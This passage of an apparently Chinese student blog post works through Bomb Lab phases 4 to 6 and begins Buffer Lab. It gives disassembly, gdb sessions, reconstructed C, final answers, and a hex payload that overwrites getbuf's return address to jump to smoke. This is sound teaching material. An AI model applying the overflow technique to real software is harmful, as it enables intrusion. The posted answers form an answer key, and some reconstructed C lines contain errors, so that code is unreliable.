class="line"> 8048d6f:	75 07                	jne    8048d78 &lt;phase_4+0x30&gt;</span><br><span class="line"> 8048d71:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048d74:	85 c0                	test   %eax,%eax</span><br><span class="line"> 8048d76:	7f 05                	jg     8048d7d &lt;phase_4+0x35&gt;</span><br><span class="line"> 8048d78:	e8 49 09 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048d7d:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048d80:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048d83:	e8 91 ff ff ff       	call   8048d19 &lt;func4&gt;</span><br><span class="line"> 8048d88:	89 45 f8             	mov    %eax,-0x8(%ebp)</span><br><span class="line"> 8048d8b:	81 7d f8 00 5f 37 00 	cmpl   $0x375f00,-0x8(%ebp) </span><br><span class="line"> 8048d92:	74 05                	je     8048d99 &lt;phase_4+0x51&gt;</span><br><span class="line"> 8048d94:	e8 2d 09 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048d99:	c9                   	leave  </span><br><span class="line"> 8048d9a:	c3                   	ret   </span><br></pre></td></tr></table></figure>
<p>与上一题相同，这里页使用了sscanf函数，找到格式字符串地址<code>0x8049a08</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x8049a08</span><br><span class="line">0x8049a08:      &quot;%d&quot;</span><br></pre></td></tr></table></figure>
<p>在判断了匹配参数是否大于1之后，程序在第21行调用了函数func4对输入进行计算，并将返回值与<code>0x375f00</code>比较，如果相等则返回。func4反汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">08048d19 &lt;func4&gt;:</span><br><span class="line"> 8048d19:	55                   	push   %ebp</span><br><span class="line"> 8048d1a:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d1c:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d1f:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp) 	# 比较参数x是否大于1</span><br><span class="line"> 8048d23:	7f 09                	jg     8048d2e &lt;func4+0x15&gt; </span><br><span class="line"> 8048d25:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp) 	# return 1</span><br><span class="line"> 8048d2c:	eb 15                	jmp    8048d43 &lt;func4+0x2a&gt;</span><br><span class="line"> 8048d2e:	8b 45 08             	mov    0x8(%ebp),%eax 	# Get x</span><br><span class="line"> 8048d31:	48                   	dec    %eax 			# x=x-1;</span><br><span class="line"> 8048d32:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048d35:	e8 df ff ff ff       	call   8048d19 &lt;func4&gt; 	# 递归调用func4(x-1)</span><br><span class="line"> 8048d3a:	89 c2                	mov    %eax,%edx 	   	# d=func4(x-1)</span><br><span class="line"> 8048d3c:	0f af 55 08          	imul   0x8(%ebp),%edx 	# d=d*x</span><br><span class="line"> 8048d40:	89 55 fc             	mov    %edx,-0x4(%ebp)</span><br><span class="line"> 8048d43:	8b 45 fc             	mov    -0x4(%ebp),%eax 	# return x*func4(x-1)</span><br><span class="line"> 8048d46:	c9                   	leave  </span><br><span class="line"> 8048d47:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>通过分析func4的反汇编代码可知，该函数为一个递归函数，计算x!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> x*func4(x<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为<code>10!=3628800</code>，即<code>0x375f00</code>，所以答案：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure>
<h3 id="phase-5">Phase 5</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">08048d9b &lt;phase_5&gt;:</span><br><span class="line"> 8048d9b:	55                   	push   %ebp</span><br><span class="line"> 8048d9c:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d9e:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8048da1:	8d 45 e8             	lea    -0x18(%ebp),%eax  	# y in M[-0x18(%ebp)]</span><br><span class="line"> 8048da4:	89 44 24 0c          	mov    %eax,0xc(%esp)</span><br><span class="line"> 8048da8:	8d 45 ec             	lea    -0x14(%ebp),%eax 	# x in M[-0x14(%ebp)]</span><br><span class="line"> 8048dab:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048daf:	c7 44 24 04 0b 9a 04 	movl   $0x8049a0b,0x4(%esp) # format string</span><br><span class="line"> 8048db6:	08 </span><br><span class="line"> 8048db7:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048dba:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048dbd:	e8 a6 fa ff ff       	call   8048868 &lt;sscanf@plt&gt;</span><br><span class="line"> 8048dc2:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 8048dc5:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp) 		# 检查输入个数</span><br><span class="line"> 8048dc9:	7f 05                	jg     8048dd0 &lt;phase_5+0x35&gt;</span><br><span class="line"> 8048dcb:	e8 f6 08 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048dd0:	8b 45 ec             	mov    -0x14(%ebp),%eax </span><br><span class="line"> 8048dd3:	83 e0 0f             	and    $0xf,%eax </span><br><span class="line"> 8048dd6:	89 45 ec             	mov    %eax,-0x14(%ebp) 	# x=x&amp;0xf</span><br><span class="line"> 8048dd9:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048ddc:	89 45 f8             	mov    %eax,-0x8(%ebp)</span><br><span class="line"> 8048ddf:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp) 	# i=0</span><br><span class="line"> 8048de6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp) 		# sum=0</span><br><span class="line"> 8048ded:	eb 16                	jmp    8048e05 &lt;phase_5+0x6a&gt;</span><br><span class="line"> 8048def:	ff 45 f0             	incl   -0x10(%ebp) 			# i++;</span><br><span class="line"> 8048df2:	8b 45 ec             	mov    -0x14(%ebp),%eax </span><br><span class="line"> 8048df5:	8b 04 85 c0 a5 04 08 	mov    0x804a5c0(,%eax,4),%eax </span><br><span class="line"> 8048dfc:	89 45 ec             	mov    %eax,-0x14(%ebp) 	# x=array[x]</span><br><span class="line"> 8048dff:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048e02:	01 45 f4             	add    %eax,-0xc(%ebp) 		# sum+=x</span><br><span class="line"> 8048e05:	8b 45 ec             	mov    -0x14(%ebp),%eax </span><br><span class="line"> 8048e08:	83 f8 0f             	cmp    $0xf,%eax 			# cmp x:15</span><br><span class="line"> 8048e0b:	75 e2                	jne    8048def &lt;phase_5+0x54&gt; </span><br><span class="line"> 8048e0d:	83 7d f0 0c          	cmpl   $0xc,-0x10(%ebp) 	# cmp i:12</span><br><span class="line"> 8048e11:	75 08                	jne    8048e1b &lt;phase_5+0x80&gt; </span><br><span class="line"> 8048e13:	8b 45 e8             	mov    -0x18(%ebp),%eax </span><br><span class="line"> 8048e16:	39 45 f4             	cmp    %eax,-0xc(%ebp) 		# cmp sum:y</span><br><span class="line"> 8048e19:	74 05                	je     8048e20 &lt;phase_5+0x85&gt; </span><br><span class="line"> 8048e1b:	e8 a6 08 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048e20:	c9                   	leave  </span><br><span class="line"> 8048e21:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>查看输入格式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x8049a0b</span><br><span class="line">0x8049a0b:      &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>
<p>通过分析汇编代码可以知道，程序在第28行调用了数组，数组地址为<code>0x804a5c0</code>，且长度为16，因为要x的范围为<code>0&lt;=x&lt;16</code>，x要作为数组索引访问数组；这里最关键的就是打印出数组的值：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p *0x804a5c0@16</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5&#125;</span></span><br></pre></td></tr></table></figure>
<p>根据汇编代码反推出phase_5函数的源程序如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">phase_5</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    <span class="type">int</span> n = ssccanf(str,<span class="string">&quot;%d %d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        explode_bomb();</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="built_in">array</span>[] = &#123;<span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    x=x&amp;<span class="number">0xf</span>;</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">0xf</span>)&#123;</span><br><span class="line">        i++;</span><br><span class="line">        x=<span class="built_in">array</span>[<span class="number">4</span>*x];</span><br><span class="line">        sum+=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">12</span>&amp;sum==y)</span><br><span class="line">    	<span class="keyword">return</span> ;</span><br><span class="line">    explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为循环只能进行12次，可以根据数组反推出x变化序列，进而得到序列和：<code>y=sum=93</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span> <span class="number">6</span> <span class="number">14</span> <span class="number">2</span> <span class="number">1</span> <span class="number">10</span> <span class="number">0</span> <span class="number">8</span> <span class="number">4</span> <span class="number">9</span> <span class="number">13</span> <span class="number">11</span> <span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>答案为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 93</span><br></pre></td></tr></table></figure>
<h3 id="phase-6">Phase 6</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">08048eb6 &lt;phase_6&gt;:</span><br><span class="line"> 8048eb6:	55                   	push   %ebp</span><br><span class="line"> 8048eb7:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048eb9:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048ebc:	c7 45 f8 6c a6 04 08 	movl   $0x804a66c,-0x8(%ebp) # 0x804a66c in M[-0x8(%ebp)]</span><br><span class="line"> 8048ec3:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048ec6:	89 04 24             	mov    %eax,(%esp)			# input_strings:str</span><br><span class="line"> 8048ec9:	e8 8a f9 ff ff       	call   8048858 &lt;atoi@plt&gt; 	# ascii to int</span><br><span class="line"> 8048ece:	89 c2                	mov    %eax,%edx 			# n1 = atoi(str)</span><br><span class="line"> 8048ed0:	8b 45 f8             	mov    -0x8(%ebp),%eax </span><br><span class="line"> 8048ed3:	89 10                	mov    %edx,(%eax) 			# n1 in 0x804a66c</span><br><span class="line"> 8048ed5:	8b 45 f8             	mov    -0x8(%ebp),%eax </span><br><span class="line"> 8048ed8:	89 04 24             	mov    %eax,(%esp) 			</span><br><span class="line"> 8048edb:	e8 42 ff ff ff       	call   8048e22 &lt;fun6&gt;</span><br><span class="line"> 8048ee0:	89 45 f8             	mov    %eax,-0x8(%ebp) 		# p=fun6(h)</span><br><span class="line"> 8048ee3:	8b 45 f8             	mov    -0x8(%ebp),%eax</span><br><span class="line"> 8048ee6:	89 45 fc             	mov    %eax,-0x4(%ebp) 		# p in M[-0x4(%ebp)]</span><br><span class="line"> 8048ee9:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp) 		# i=1</span><br><span class="line"> 8048ef0:	eb 0c                	jmp    8048efe &lt;phase_6+0x48&gt;</span><br><span class="line"> 8048ef2:	8b 45 fc             	mov    -0x4(%ebp),%eax 		</span><br><span class="line"> 8048ef5:	8b 40 08             	mov    0x8(%eax),%eax 		</span><br><span class="line"> 8048ef8:	89 45 fc             	mov    %eax,-0x4(%ebp) 		# p=p-&gt;next</span><br><span class="line"> 8048efb:	ff 45 f4             	incl   -0xc(%ebp) 			# i++;</span><br><span class="line"> 8048efe:	83 7d f4 08          	cmpl   $0x8,-0xc(%ebp) 		# cmp i:8</span><br><span class="line"> 8048f02:	7e ee                	jle    8048ef2 &lt;phase_6+0x3c&gt; </span><br><span class="line"> 8048f04:	8b 45 fc             	mov    -0x4(%ebp),%eax </span><br><span class="line"> 8048f07:	8b 10                	mov    (%eax),%edx			# get n2=p-&gt;val</span><br><span class="line"> 8048f09:	a1 6c a6 04 08       	mov    0x804a66c,%eax 		# get n1</span><br><span class="line"> 8048f0e:	39 c2                	cmp    %eax,%edx 			# cmp n2:n1</span><br><span class="line"> 8048f10:	74 05                	je     8048f17 &lt;phase_6+0x61&gt;</span><br><span class="line"> 8048f12:	e8 af 07 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048f17:	c9                   	leave  </span><br><span class="line"> 8048f18:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>phase_6一开始调用了函数atoi，该函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">atoi</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br><span class="line"><span class="comment">// str -- 要转换为整数的字符串。</span></span><br><span class="line"><span class="comment">// 该函数返回转换后的长整数，如果没有执行有效的转换，则返回零。</span></span><br></pre></td></tr></table></figure>
<p>所以猜测需要输入一个可以转换为整数的字符串。运行程序并输入测试字符串<code>"12345"</code>，查看调用atoi函数前栈中的数据，可以看到输入字符串的地址被存放在栈顶，字符串起始地址为<code>0x804aa30</code>。在调用了atoi函数后，程序将返回值存放到了地址<code>0x804a66c</code>中，打印出来显示是刚刚输入的字符串转成的数字：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s <span class="number">0</span>x804aa30</span><br><span class="line"><span class="number">0</span>x804aa30 &lt;input_strings+<span class="number">400</span>&gt;:  <span class="string">&quot;12&quot;</span></span><br><span class="line">...</span><br><span class="line">(gdb) x/d <span class="number">0</span>x804a66c</span><br><span class="line"><span class="number">0</span>x804a66c &lt;node0&gt;:      <span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>接下来程序调用了函数fun6，并将返回值放入到<code>-0x4(%ebp)</code>中；其中第18到24行为链表的访问，执行8次后跳出循环。最后终止时比较与
atoi
转换的结果是否一致。通过阅读fun6的反汇编代码可知fun6函数并没有使用到atoi
转换的结果，所以直接运行到第27行查看寄存器<code>%edx</code>的值，该值为fun6得到的结果：149。最终答案为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">149</span></span><br></pre></td></tr></table></figure>
<h2 id="实验结果-1">实验结果</h2>
<p>phase1~6的答案如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The <span class="built_in">future</span> will be better tomorrow.</span><br><span class="line"><span class="number">5</span> <span class="number">10</span> <span class="number">15</span> <span class="number">20</span> <span class="number">25</span> <span class="number">30</span></span><br><span class="line"><span class="number">0</span> t <span class="number">870</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">7</span> <span class="number">93</span></span><br><span class="line"><span class="number">149</span></span><br></pre></td></tr></table></figure>
<p>按照阶段依次输入上面分析的答案，运行结果截图如下：</p>
<p><img src="/post/ba783922/image-20221029143516251.png" alt="image-20221029143516251" style="zoom:67%;"></p>
<h1 id="实验3缓冲区溢出buffer-lab">实验3：缓冲区溢出（Buffer Lab）</h1>
<h2 id="实验目标">实验目标</h2>
<ul>
<li><p>掌握函数调用时的栈帧结构</p></li>
<li><p>利用输入缓冲区的溢出漏洞，将攻击代码嵌入当前程序的栈帧中，使得程序执行我们所期望的过程</p></li>
</ul>
<h2 id="实验介绍-2">实验介绍</h2>
<ul>
<li>文件组成
<ul>
<li>makecookie：生成cookie 例：./makecookie SA18225155 生成cookie</li>
<li>Bufbomb：可执行程序-攻击对象</li>
<li>Sendstring: 字符格式转换</li>
</ul></li>
<li>bufbomb程序</li>
</ul>
<p>Bufbomb中包含一个getbuf函数，该函数实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// 对buf没有越界检查,超过11个字符将溢出</span></span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>getbuf的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08048fe0 &lt;getbuf&gt;:</span><br><span class="line"> 8048fe0:	55                   	push   %ebp				#压入返回地址</span><br><span class="line"> 8048fe1:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048fe3:	83 ec 18             	sub    $0x18,%esp		#allocate 24B</span><br><span class="line"> 8048fe6:	8d 45 f4             	lea    -0xc(%ebp),%eax	#get string address</span><br><span class="line"> 8048fe9:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048fec:	e8 6f fe ff ff       	call   8048e60 &lt;Gets&gt;</span><br><span class="line"> 8048ff1:	b8 01 00 00 00       	mov    $0x1,%eax		#return 1;</span><br><span class="line"> 8048ff6:	c9                   	leave  </span><br><span class="line"> 8048ff7:	c3                   	ret    </span><br><span class="line"> 8048ff8:	90                   	nop</span><br><span class="line"> 8048ff9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi</span><br></pre></td></tr></table></figure>
<ul>
<li>溢出</li>
</ul>
<p>溢出的字符将覆盖栈帧上的数据，特别的，会覆盖程序调用的返回地址，赋予我们控制程序流程的能力；通过构造溢出字符串，程序将“返回”至我们想要的代码上。</p>
<ul>
<li>字符构造</li>
</ul>
<p>计算机系统中，字符以ASCII码表示
/存储，例如，输入’1’，存储为’0x31’。本实验也需要扩展的ASCII码（128~255）。为了构造所需要的地址或其他数据，我们需要逆反”字符-&gt;ASCII码”的过程；采用代码包给出的
sendstring工具。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sendstring &lt; exploit.txt &gt; exploit<span class="literal">-raw</span>.txt</span><br></pre></td></tr></table></figure>
<p>其中exploit.txt保存目标数据（即空格分隔的ASCII码），exploit-raw.txt为逆向出的字符串。</p>
<ul>
<li>字符串输入</li>
</ul>
<p>前述方法构造出的字符串按如下方式输入：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bufbomb <span class="literal">-t</span> SA18225155 &lt; exploit<span class="literal">-raw</span>.txt</span><br></pre></td></tr></table></figure>
<p>从标准输入设备输入：ALT+ASC码的十进制数（小键盘输入）。注意，最后一个数字按下后与ALT键同时放开。例，输入字符“1”为ALT+49。实验完成后提交exploit.txt文件。</p>
<ul>
<li>指令构造方法示例</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pushl $0x89abcdef 	# Push value onto stack </span><br><span class="line">addl $17,%eax 		# Add 17 to %eax </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>保存成example.s，然后输入命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c example.s </span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure>
<h2 id="实验过程">实验过程</h2>
<h3 id="level-0-candle">Level 0: Candle</h3>
<blockquote>
<p>目标：Bufbomb中一个正常情况下不会被执行的函数smoke，在getbuf返回时跳到smoke函数执行。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">smoke</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    entry_check(<span class="number">0</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Smoke!: You called smoke()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要将smoke函数的地址放入getbuf的返回地址，需要构造合适的输入字符串。通过阅读getbuf的汇编代码可以知道输入字符串首地址被存放在内存栈<code>-0xc(%ebp)</code>中，运行程序，输入测试字符串，并打印出该字符串作验证。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb bufbomb</span><br><span class="line">(gdb) b getbuf</span><br><span class="line">(gdb) run -t SAXXXXXXXX</span><br><span class="line">Starting program: /home/ubuntu/桌面/bufferlab/bufbomb -t SAXXXXXXXX</span><br><span class="line">Team: SAXXXXXXXX</span><br><span class="line">Cookie: 0x58932f5a</span><br><span class="line">...</span><br><span class="line">(gdb) x/s $ebp-0xc</span><br><span class="line">0xffffb96c:     &quot;hello world&quot;</span><br></pre></td></tr></table></figure>
<p>所以可以知道字符串首地址<code>0xffffb96c</code>。用smoke函数的地址覆盖getbuf的返回地址，还需要找到函数smoke函数的首地址：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x &amp;smoke</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0x8048e20</span></span><br></pre></td></tr></table></figure>
<p>在test的汇编代码中，getbuf的下一行指令的地址为<code>0x804901e</code>，该地址在调用getbuf后被保存在<code>%ebp+0x4</code>中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">08049000 &lt;test&gt;:</span><br><span class="line">...</span><br><span class="line"> 8049019:	e8 c2 ff ff ff       	call   8048fe0 &lt;getbuf&gt;</span><br><span class="line"> 804901e:	89 c2                	mov    %eax,%edx</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x $ebp+4</span><br><span class="line">0xffffb97c:     0x0804901e</span><br></pre></td></tr></table></figure>
<p>从<code>0xffffb96c</code>覆盖到<code>0xffffb97c</code>，需要先填充
16字节字符串内容，然后填充smoke函数的地址：<code>20</code>,<code>8e</code>,<code>04</code>,<code>08</code>（小端机器），如果是
64 位机器则需要继续覆盖后面为
0。所以我们需要构造字符串十六进制表示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// exploit0.txt</span><br><span class="line">31 31 31 31 31 31 31 31 </span><br><span class="line">32 32 32 32 32 32 32 32 </span><br><span class="line">20 8e 04 08 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>使用工具生成字符串并运行程序，结果如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./sendstring &lt; exploit0.txt &gt; exploit<span class="literal">-raw</span>.txt</span><br><span class="line">./bufbomb <span class="literal">-t</span> SAXXXXXXXX &lt; exploit<span class="literal">-raw</span>.txt</span><br></pre></td></tr></table></figure>
<p><img src="/post/ba783922/image-20221029171139653.png"></p>
<h3 id="level-1-sparkler">Level 1: Sparkler</h3>
<blockquote>
<p>目标：调用 fizz(val) 函数，并将自己的 cookies
传递为参数。（Cookie必须为自己学号生成）</p>
</blockquote>
